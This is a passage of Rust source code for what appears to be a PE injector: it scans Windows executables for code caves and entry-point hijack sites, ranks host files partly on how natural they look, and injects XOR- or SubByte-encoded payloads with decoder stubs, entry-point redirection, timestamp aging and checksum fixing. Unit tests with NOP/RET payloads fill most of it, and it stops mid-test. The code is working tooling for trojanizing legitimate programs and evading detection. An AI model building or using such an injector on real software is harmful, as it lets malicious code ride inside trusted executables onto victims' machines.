/// Analyze a single PE file for injection suitability. Never fails — returns
/// `valid: false` with an error message for invalid PEs.
pub fn scan_target(path: &Path) -> TargetInfo {
    let file_size = match std::fs::metadata(path) {
        Ok(m) => m.len(),
        Err(e) => {
            return TargetInfo {
                path: path.to_path_buf(),
                file_size: 0,
                num_sections: 0,
                largest_cave_bytes: 0,
                largest_cave_section: None,
                has_hijack_site: false,
                has_writable_section_cave: false,
                valid: false,
                error: Some(format!("Cannot read file: {}", e)),
            };
        }
    };

    let pe_bytes = match std::fs::read(path) {
        Ok(b) => b,
        Err(e) => {
            return TargetInfo {
                path: path.to_path_buf(),
                file_size,
                num_sections: 0,
                largest_cave_bytes: 0,
                largest_cave_section: None,
                has_hijack_site: false,
                has_writable_section_cave: false,
                valid: false,
                error: Some(format!("Cannot read file: {}", e)),
            };
        }
    };

    if let Err(e) = validate_pe(&pe_bytes) {
        return TargetInfo {
            path: path.to_path_buf(),
            file_size,
            num_sections: 0,
            largest_cave_bytes: 0,
            largest_cave_section: None,
            has_hijack_site: false,
            has_writable_section_cave: false,
            valid: false,
            error: Some(format!("{}", e)),
        };
    }

    let (_, num_sections) = section_table_info(&pe_bytes);
    let caves = find_code_caves(&pe_bytes);

    let largest_cave_bytes = caves.first().map(|c| c.available).unwrap_or(0);
    let largest_cave_section = caves.first().map(|c| c.section_name.clone());
    let has_writable_section_cave = caves
        .iter()
        .any(|c| c.available > 0 && (c.characteristics & IMAGE_SCN_MEM_WRITE) != 0);

    let opt_header_off = optional_header_offset(&pe_bytes);
    let entry_rva = read_u32(&pe_bytes, opt_header_off + 0x10);
    let has_hijack_site = find_hijack_site(&pe_bytes, entry_rva, 256).is_some();

    TargetInfo {
        path: path.to_path_buf(),
        file_size,
        num_sections,
        largest_cave_bytes,
        largest_cave_section,
        has_hijack_site,
        has_writable_section_cave,
        valid: true,
        error: None,
    }
}

/// Scan a directory for `.exe` files and return suitability info, sorted by
/// largest cave size descending.
pub fn scan_injectables_dir(dir: &Path) -> Result<Vec<TargetInfo>> {
    let mut targets = Vec::new();
    for entry in std::fs::read_dir(dir).context("Failed to read injectables directory")? {
        let entry = entry?;
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("exe") {
            targets.push(scan_target(&path));
        }
    }
    targets.sort_by(|a, b| b.largest_cave_bytes.cmp(&a.largest_cave_bytes));
    Ok(targets)
}

/// Pick the best target PE for a given payload size, encoding, and modes.
///
/// Returns `None` if no target is suitable — caller can fall back to
/// `NewSection` mode or error.
pub fn select_best_target(
    targets: &[TargetInfo],
    payload_size: usize,
    encoding: EncodingType,
    injection_mode: InjectionMode,
    redirect_mode: RedirectMode,
) -> Option<&TargetInfo> {
    // Compute stub overhead for the encoding type
    let (stub_code, layout, extra_key_size) = match encoding {
        EncodingType::Xor => (XOR_STUB_CODE, XOR_LAYOUT, 2usize),
        EncodingType::SubByte => (SUBBYTE_STUB_CODE, SUBBYTE_LAYOUT, 256usize),
        EncodingType::None => (NONE_STUB_CODE, NONE_LAYOUT, 0usize),
        EncodingType::English => return None, // not supported for PE injection
    };
    let _ = layout; // only need code_size from the stub
    let encoded_payload_size = match encoding {
        EncodingType::SubByte => payload_size * 2, // SubByte doubles size
        _ => payload_size,
    };
    let stub_overhead = stub_code.len() + extra_key_size;
    let total_needed = stub_overhead + encoded_payload_size;

    let valid_targets: Vec<&TargetInfo> = targets.iter().filter(|t| t.valid).collect();

    let mut candidates: Vec<&TargetInfo> = match injection_mode {
        InjectionMode::CodeCave => valid_targets
            .into_iter()
            .filter(|t| t.largest_cave_bytes >= total_needed)
            .collect(),
        InjectionMode::NewSection | InjectionMode::SplitCave => {
            // Any valid PE works for NewSection
            valid_targets
        }
    };

    // If EpHijack redirect, must have a hijack site
    if redirect_mode == RedirectMode::EpHijack {
        candidates.retain(|t| t.has_hijack_site);
    }

    if candidates.is_empty() {
        return None;
    }

    // For XOR/SubByte + CodeCave, prefer writable section caves
    let needs_write = matches!(encoding, EncodingType::Xor | EncodingType::SubByte);
    if injection_mode == InjectionMode::CodeCave && needs_write {
        let writable: Vec<&&TargetInfo> = candidates
            .iter()
            .filter(|t| t.has_writable_section_cave)
            .collect();
        if !writable.is_empty() {
            // Among writable candidates, pick by cave size then file size
            return writable
                .into_iter()
                .max_by_key(|t| (t.largest_cave_bytes, t.file_size))
                .copied();
        }
    }

    // Rank by cave size (primary), file size (secondary — larger PEs look more natural)
    candidates
        .into_iter()
        .max_by_key(|t| (t.largest_cave_bytes, t.file_size))
}

// =============================================================================
// Test Helpers
// =============================================================================

/// Build a minimal valid PE32+ x64 binary for testing.
///
/// Layout:
/// - DOS header (64 bytes, e_lfanew → 0x80)
/// - DOS stub padding (64 bytes)
/// - PE signature at 0x80 (4 bytes)
/// - COFF header (20 bytes)
/// - Optional header PE32+ (240 bytes, 16 data directories)
/// - Section table: 1 entry (40 bytes) — room for 2 more in headers
/// - .text section at file offset 0x200, VA 0x1000: single `ret` (0xC3)
///
/// FileAlignment = 0x200, SectionAlignment = 0x1000, SizeOfImage = 0x2000
#[cfg(test)]
fn build_test_pe64() -> Vec<u8> {
    let file_align: u32 = 0x200;
    let sec_align: u32 = 0x1000;
    let text_rva: u32 = 0x1000;
    let text_size: u32 = 1; // just `ret`
    let pe_sig_offset: u32 = 0x80;
    let opt_header_size: u16 = 240; // standard PE32+ with 16 data dirs
    let num_sections: u16 = 1;

    // Total headers size: pe_sig(0x80) + PE_sig(4) + COFF(20) + OptHeader(240) + SectionTable(40*1) = 384
    // Aligned to file_align(0x200) = 0x200 = 512
    let headers_size: u32 = file_align; // 0x200

    // Total file: headers(0x200) + .text padded to file_align(0x200)
    let total_size = headers_size as usize + file_align as usize;
    let mut pe = vec![0u8; total_size];

    // --- DOS header ---
    pe[0] = b'M';
    pe[1] = b'Z';
    write_u32_at(&mut pe, 0x3C, pe_sig_offset);

    // --- PE signature ---
    let ps = pe_sig_offset as usize;
    pe[ps] = b'P';
    pe[ps + 1] = b'E';

    // --- COFF header ---
    let coff = ps + 4;
    write_u16_at(&mut pe, coff, 0x8664); // Machine: AMD64
    write_u16_at(&mut pe, coff + 2, num_sections); // NumberOfSections
    write_u16_at(&mut pe, coff + 16, opt_header_size); // SizeOfOptionalHeader
    write_u16_at(&mut pe, coff + 18, 0x0022); // Characteristics: EXECUTABLE | LARGE_ADDRESS_AWARE

    // --- Optional header (PE32+) ---
    let opt = coff + 20;
    write_u16_at(&mut pe, opt, 0x020B); // Magic: PE32+
    pe[opt + 2] = 14; // MajorLinkerVersion
    pe[opt + 3] = 0; // MinorLinkerVersion
    write_u32_at(&mut pe, opt + 0x10, text_rva); // AddressOfEntryPoint
    // ImageBase (8 bytes at opt + 0x18)
    pe[opt + 0x18] = 0x00;
    pe[opt + 0x19] = 0x00;
    pe[opt + 0x1A] = 0x40;
    pe[opt + 0x1B] = 0x00;
    // 0x00400000 in LE across 8 bytes
    write_u32_at(&mut pe, opt + 0x20, sec_align); // SectionAlignment
    write_u32_at(&mut pe, opt + 0x24, file_align); // FileAlignment
    write_u16_at(&mut pe, opt + 0x28, 6); // MajorOSVersion
    write_u16_at(&mut pe, opt + 0x2C, 6); // MajorSubsystemVersion
    write_u32_at(&mut pe, opt + 0x38, sec_align * 2); // SizeOfImage: 0x2000
    write_u32_at(&mut pe, opt + 0x3C, headers_size); // SizeOfHeaders
    write_u16_at(&mut pe, opt + 0x44, 3); // Subsystem: CONSOLE
    // DllCharacteristics
    write_u16_at(&mut pe, opt + 0x46, 0x8160); // DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE | HIGH_ENTROPY_VA
    // Stack/Heap sizes (8 bytes each at opt+0x48..0x68)
    write_u32_at(&mut pe, opt + 0x48, 0x100000); // SizeOfStackReserve (low dword)
    write_u32_at(&mut pe, opt + 0x50, 0x1000); // SizeOfStackCommit
    write_u32_at(&mut pe, opt + 0x58, 0x100000); // SizeOfHeapReserve
    write_u32_at(&mut pe, opt + 0x60, 0x1000); // SizeOfHeapCommit
    // NumberOfRvaAndSizes
    write_u32_at(&mut pe, opt + 0x6C, 16);

    // --- Section table ---
    let sec_table = opt + opt_header_size as usize;
    // .text section
    pe[sec_table..sec_table + 6].copy_from_slice(b".text\0");
    write_u32_at(&mut pe, sec_table + 8, text_size); // VirtualSize
    write_u32_at(&mut pe, sec_table + 12, text_rva); // VirtualAddress
    write_u32_at(&mut pe, sec_table + 16, file_align); // SizeOfRawData
    write_u32_at(&mut pe, sec_table + 20, headers_size); // PointerToRawData
    write_u32_at(&mut pe, sec_table + 36, 0x6000_0020); // CODE | MEM_EXECUTE | MEM_READ

    // --- .text section data ---
    pe[headers_size as usize] = 0xC3; // ret

    pe
}

/// Build a PE32+ x64 binary with controllable .text padding for code cave tests.
///
/// - `text_vs`: VirtualSize for .text (actual code area).
/// - `text_raw_size`: SizeOfRawData for .text (will be aligned up to FileAlignment).
///   Gap = `aligned(text_raw_size) - text_vs` bytes of zero padding = code cave.
/// - `ep_code`: bytes to write at the entry point (start of .text).
///
/// EP is at the start of .text (RVA 0x1000). Set `text_vs >= 0x200` to ensure
/// the code cave starts past the EP ± 0x100 protection zone.
#[cfg(test)]
fn build_test_pe64_with_cave(text_vs: u32, text_raw_size: u32, ep_code: &[u8]) -> Vec<u8> {
    let file_align: u32 = 0x200;
    let sec_align: u32 = 0x1000;
    let text_rva: u32 = 0x1000;
    let pe_sig_offset: u32 = 0x80;
    let opt_header_size: u16 = 240;
    let num_sections: u16 = 1;
    let headers_size: u32 = file_align;

    let aligned_raw = align_up(text_raw_size, file_align);
    let total_size = headers_size as usize + aligned_raw as usize;
    let mut pe = vec![0u8; total_size];

    // DOS header
    pe[0] = b'M';
    pe[1] = b'Z';
    write_u32_at(&mut pe, 0x3C, pe_sig_offset);

    // PE signature
    let ps = pe_sig_offset as usize;
    pe[ps] = b'P';
    pe[ps + 1] = b'E';

    // COFF header
    let coff = ps + 4;
    write_u16_at(&mut pe, coff, 0x8664);
    write_u16_at(&mut pe, coff + 2, num_sections);
    write_u16_at(&mut pe, coff + 16, opt_header_size);
    write_u16_at(&mut pe, coff + 18, 0x0022);

    // Optional header (PE32+)
    let opt = coff + 20;
    write_u16_at(&mut pe, opt, 0x020B);
    pe[opt + 2] = 14;
    write_u32_at(&mut pe, opt + 0x10, text_rva); // EP = start of .text
    pe[opt + 0x18] = 0x00;
    pe[opt + 0x19] = 0x00;
    pe[opt + 0x1A] = 0x40;
    pe[opt + 0x1B] = 0x00;
    write_u32_at(&mut pe, opt + 0x20, sec_align);
    write_u32_at(&mut pe, opt + 0x24, file_align);
    write_u16_at(&mut pe, opt + 0x28, 6);
    write_u16_at(&mut pe, opt + 0x2C, 6);
    write_u32_at(&mut pe, opt + 0x38, text_rva + align_up(text_vs, sec_align)); // SizeOfImage
    write_u32_at(&mut pe, opt + 0x3C, headers_size);
    write_u16_at(&mut pe, opt + 0x44, 3);
    write_u16_at(&mut pe, opt + 0x46, 0x8160);
    write_u32_at(&mut pe, opt + 0x48, 0x100000);
    write_u32_at(&mut pe, opt + 0x50, 0x1000);
    write_u32_at(&mut pe, opt + 0x58, 0x100000);
    write_u32_at(&mut pe, opt + 0x60, 0x1000);
    write_u32_at(&mut pe, opt + 0x6C, 16);

    // Section table: .text
    let sec_table = opt + opt_header_size as usize;
    pe[sec_table..sec_table + 6].copy_from_slice(b".text\0");
    write_u32_at(&mut pe, sec_table + 8, text_vs);
    write_u32_at(&mut pe, sec_table + 12, text_rva);
    write_u32_at(&mut pe, sec_table + 16, aligned_raw);
    write_u32_at(&mut pe, sec_table + 20, headers_size);
    write_u32_at(&mut pe, sec_table + 36, 0x6000_0020); // CODE | MEM_EXECUTE | MEM_READ

    // Write EP code at start of .text
    let code_start = headers_size as usize;
    let code_len = std::cmp::min(ep_code.len(), text_vs as usize);
    pe[code_start..code_start + code_len].copy_from_slice(&ep_code[..code_len]);

    pe
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_validate_pe_valid() {
        let pe = build_test_pe64();
        assert!(validate_pe(&pe).is_ok());
    }

    #[test]
    fn test_validate_pe_rejects_non_pe() {
        let data = vec![0u8; 128];
        assert!(validate_pe(&data).is_err());
    }

    #[test]
    fn test_validate_pe_rejects_too_small() {
        let data = vec![0u8; 10];
        assert!(validate_pe(&data).is_err());
    }

    #[test]
    fn test_validate_pe_rejects_32bit() {
        let mut pe = build_test_pe64();
        // Change machine to i386 (0x014C)
        let e_lfanew = read_u32(&pe, 0x3C) as usize;
        write_u16_at(&mut pe, e_lfanew + 4, 0x014C);
        let err = validate_pe(&pe).unwrap_err();
        assert!(err.to_string().contains("0x14c"), "Error: {}", err);
    }

    #[test]
    fn test_validate_pe_rejects_pe32() {
        let mut pe = build_test_pe64();
        // Change magic to PE32 (0x010B)
        let opt_off = optional_header_offset(&pe);
        write_u16_at(&mut pe, opt_off, 0x010B);
        let err = validate_pe(&pe).unwrap_err();
        assert!(err.to_string().contains("PE32+"), "Error: {}", err);
    }

    #[test]
    fn test_read_write_entry_point() {
        let mut pe = build_test_pe64();
        let opt_off = optional_header_offset(&pe);

        // Read original EP
        let ep = read_u32(&pe, opt_off + 0x10);
        assert_eq!(ep, 0x1000);

        // Write new EP
        write_u32_at(&mut pe, opt_off + 0x10, 0x2000);
        assert_eq!(read_u32(&pe, opt_off + 0x10), 0x2000);

        // Restore
        write_u32_at(&mut pe, opt_off + 0x10, ep);
        assert_eq!(read_u32(&pe, opt_off + 0x10), 0x1000);
    }

    #[test]
    fn test_add_section_alignment() {
        let mut pe = build_test_pe64();
        let original_sections = section_table_info(&pe).1;
        let original_image_size = size_of_image(&pe);

        let test_data = vec![0xCCu8; 100];
        let rva = add_section(&mut pe, b".test\0\0\0", &test_data, 0x4000_0040).unwrap();

        // Section should be aligned to SectionAlignment (0x1000)
        assert_eq!(rva % section_alignment(&pe), 0);

        // Number of sections should increase by 1
        let new_sections = section_table_info(&pe).1;
        assert_eq!(new_sections, original_sections + 1);

        // SizeOfImage should increase
        let new_image_size = size_of_image(&pe);
        assert!(new_image_size > original_image_size);

        // Validate with goblin
        goblin::pe::PE::parse(&pe).expect("PE should be valid after adding section");
    }

    #[test]
    fn test_inject_none() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        // Test payload: NOP NOP RET
        let payload = vec![0x90, 0x90, 0xC3];
        let input = PeInjectInput {
            payload: payload.clone(),
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();

        assert!(artifact.output_path.exists());
        assert!(artifact.size_bytes > 0);
        assert_eq!(artifact.original_entry_point, 0x1000);
        assert_ne!(artifact.injected_section_rva, 0x1000);
        assert!(artifact.mutations_applied.is_empty());

        // Validate output with goblin
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let parsed = goblin::pe::PE::parse(&output_bytes).unwrap();

        // Entry point should be the injected section
        assert_eq!(parsed.entry as u32, artifact.injected_section_rva);

        // Should have one more section than original
        assert_eq!(parsed.sections.len(), 2);
    }

    #[test]
    fn test_inject_xor() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let payload = vec![0x90; 256]; // 256 NOPs
        let input = PeInjectInput {
            payload,
            encoding: EncodingType::Xor,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert!(artifact.output_path.exists());

        // Validate with goblin
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        goblin::pe::PE::parse(&output_bytes).unwrap();
    }

    #[test]
    fn test_inject_subbyte() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let payload = vec![0x90; 64];
        let input = PeInjectInput {
            payload,
            encoding: EncodingType::SubByte,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert!(artifact.output_path.exists());

        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        goblin::pe::PE::parse(&output_bytes).unwrap();
    }

    #[test]
    fn test_inject_rejects_english() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90],
            encoding: EncodingType::English,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        assert!(injector.inject(&input).is_err());
    }

    #[test]
    fn test_inject_with_oep_return() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3], // NOP RET
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: true,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();

        // The OEP delta should be patched in the output
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        goblin::pe::PE::parse(&output_bytes).unwrap();

        // Original EP should be preserved in artifact metadata
        assert_eq!(artifact.original_entry_point, 0x1000);
    }

    #[test]
    fn test_inject_with_binary_mutations() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3],
            encoding: EncodingType::None,
            binary_mutations: vec![MutationSpec::from_cli_str("binary.timestamp:age_days=365")],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert!(artifact.output_path.exists());
        assert!(!artifact.mutations_applied.is_empty());

        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        goblin::pe::PE::parse(&output_bytes).unwrap();
    }

    #[test]
    fn test_inject_preserves_original_sections() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        // Parse original
        let original_parsed = goblin::pe::PE::parse(&pe).unwrap();
        let original_section_count = original_parsed.sections.len();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3],
            encoding: EncodingType::Xor,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let output_parsed = goblin::pe::PE::parse(&output_bytes).unwrap();

        // Should have exactly one more section
        assert_eq!(output_parsed.sections.len(), original_section_count + 1);

        // First section should still be .text
        let first_section_name = String::from_utf8_lossy(&output_parsed.sections[0].name)
            .trim_end_matches('\0')
            .to_string();
        assert_eq!(first_section_name, ".text");

        // Last section should be .extra
        let last_section_name =
            String::from_utf8_lossy(&output_parsed.sections[output_parsed.sections.len() - 1].name)
                .trim_end_matches('\0')
                .to_string();
        assert_eq!(last_section_name, ".extra");
    }

    #[test]
    fn test_pe_checksum_nonzero() {
        let mut pe = build_test_pe64();
        compute_pe_checksum(&mut pe);
        let opt_off = optional_header_offset(&pe);
        let checksum = read_u32(&pe, opt_off + 0x40);
        assert_ne!(
            checksum, 0,
            "PE checksum should be non-zero after computation"
        );
    }

    #[test]
    fn test_injector_rejects_missing_target() {
        let config = PeInjectConfig {
            target_pe_path: Some(PathBuf::from("/nonexistent/path.exe")),
            injectables_dir: None,
            output_dir: PathBuf::from("/tmp/test_output"),
        };
        assert!(PeInjector::new(config).is_err());
    }

    #[test]
    fn test_injector_rejects_no_target_source() {
        let config = PeInjectConfig {
            target_pe_path: None,
            injectables_dir: None,
            output_dir: PathBuf::from("/tmp/test_output"),
        };
        assert!(PeInjector::new(config).is_err());
    }

    #[test]
    fn test_artifact_id_is_sha256() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64();
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0xCC],
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();

        // Verify the SHA256 matches
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let mut hasher = Sha256::new();
        hasher.update(&output_bytes);
        let expected_sha = hex::encode(hasher.finalize());
        assert_eq!(artifact.artifact_id, expected_sha);

        // Output filename should be <sha256>.exe
        let filename = artifact.output_path.file_name().unwrap().to_str().unwrap();
        assert_eq!(filename, format!("{}.exe", expected_sha));
    }

    // =========================================================================
    // E1: Code Cave Tests
    // =========================================================================

    #[test]
    fn test_find_caves_in_padded_pe() {
        // .text with VS=0x200, SizeOfRawData=0x600 → cave after EP protection zone
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let caves = find_code_caves(&pe);

        assert!(!caves.is_empty(), "Should find at least one code cave");
        let cave = &caves[0];
        assert_eq!(cave.section_name, ".text");
        assert!(cave.available > 0);
        // Cave should start past EP (0x1000) + 0x100 protection = 0x1100 or at VS boundary
        // VS=0x200 → gap starts at RVA 0x1200, which is past 0x1100
        assert!(
            cave.rva >= 0x1200,
            "Cave RVA {:#x} should be >= 0x1200",
            cave.rva
        );
    }

    #[test]
    fn test_cave_injection_no_new_section() {
        let tmp = TempDir::new().unwrap();
        // Large padding: VS=0x200, Raw=0x600 → ~1024 bytes of cave past EP protection
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let original_sections = section_table_info(&pe).1;

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3], // NOP RET
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::CodeCave,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert_eq!(artifact.injection_mode_used, InjectionMode::CodeCave);
        assert!(artifact.cave_section.is_some());
        assert_eq!(artifact.cave_section.as_deref(), Some(".text"));

        // NumberOfSections should be unchanged
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let new_sections = section_table_info(&output_bytes).1;
        assert_eq!(
            new_sections, original_sections,
            "No new section should be added"
        );

        goblin::pe::PE::parse(&output_bytes).unwrap();
    }

    #[test]
    fn test_cave_injection_virtual_size_updated() {
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let (sec_off, _) = section_table_info(&pe);
        let old_vs = read_u32(&pe, sec_off + 8);

        let caves = find_code_caves(&pe);
        assert!(!caves.is_empty());

        let mut pe_mut = pe;
        let data = vec![0xCCu8; 64];
        inject_into_cave(&mut pe_mut, &caves[0], &data).unwrap();

        let new_vs = read_u32(&pe_mut, sec_off + 8);
        assert!(
            new_vs > old_vs,
            "VirtualSize should grow: old={:#x} new={:#x}",
            old_vs,
            new_vs
        );
    }

    #[test]
    fn test_cave_too_small_fallback() {
        let tmp = TempDir::new().unwrap();
        // Tiny padding: VS=0x1FF, Raw=0x200 → only 1 byte of gap (way too small)
        let pe = build_test_pe64_with_cave(0x1FF, 0x200, &[0xC3]);
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90; 100],
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::CodeCave,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        // Should fall back to NewSection since cave is too small
        assert_eq!(artifact.injection_mode_used, InjectionMode::NewSection);
        assert!(artifact.cave_section.is_none());

        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        goblin::pe::PE::parse(&output_bytes).unwrap();
    }

    #[test]
    fn test_cave_nonzero_padding_rejected() {
        // Build PE with padding that has non-zero bytes
        let mut pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        // Write 0xCC into the padding area
        let (sec_off, _) = section_table_info(&pe);
        let raw_ptr = read_u32(&pe, sec_off + 20) as usize;
        let vs = read_u32(&pe, sec_off + 8) as usize;
        pe[raw_ptr + vs] = 0xCC; // Non-zero byte in padding

        let caves = find_code_caves(&pe);
        assert!(
            caves.is_empty(),
            "Cave with non-zero padding should be rejected"
        );
    }

    #[test]
    fn test_cave_write_permission_added() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        // Verify .text starts without MEM_WRITE
        let (sec_off, _) = section_table_info(&pe);
        let chars = read_u32(&pe, sec_off + 36);
        assert_eq!(
            chars & IMAGE_SCN_MEM_WRITE,
            0,
            ".text should not have MEM_WRITE initially"
        );

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90; 32],
            encoding: EncodingType::Xor, // Requires MEM_WRITE for in-place decode
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::CodeCave,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert_eq!(artifact.injection_mode_used, InjectionMode::CodeCave);

        // Verify MEM_WRITE was added
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let (out_sec_off, _) = section_table_info(&output_bytes);
        let out_chars = read_u32(&output_bytes, out_sec_off + 36);
        assert_ne!(
            out_chars & IMAGE_SCN_MEM_WRITE,
            0,
            ".text should have MEM_WRITE after XOR cave injection"
        );
    }

    #[test]
    fn test_cave_none_encoding_no_write() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3],
            encoding: EncodingType::None, // No in-place decode needed
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::CodeCave,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert_eq!(artifact.injection_mode_used, InjectionMode::CodeCave);

        // Verify MEM_WRITE was NOT added
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let (out_sec_off, _) = section_table_info(&output_bytes);
        let out_chars = read_u32(&output_bytes, out_sec_off + 36);
        assert_eq!(
            out_chars & IMAGE_SCN_MEM_WRITE,
            0,
            ".text should NOT have MEM_WRITE for None encoding"
        );
    }

    // =========================================================================
    // E2: EP Hijack Tests
    // =========================================================================

    #[test]
    fn test_ep_hijack_finds_call() {
        // EP starts with: sub rsp, 0x28 (4 bytes) ; call <rel32> (5 bytes) ; add rsp, 0x28 ; ret
        #[rustfmt::skip]
        let ep_code: Vec<u8> = vec![
            0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28 (skipped: first instruction)
            0xE8, 0x10, 0x00, 0x00, 0x00,               // call +0x10 (FOUND: second instruction, len=5)
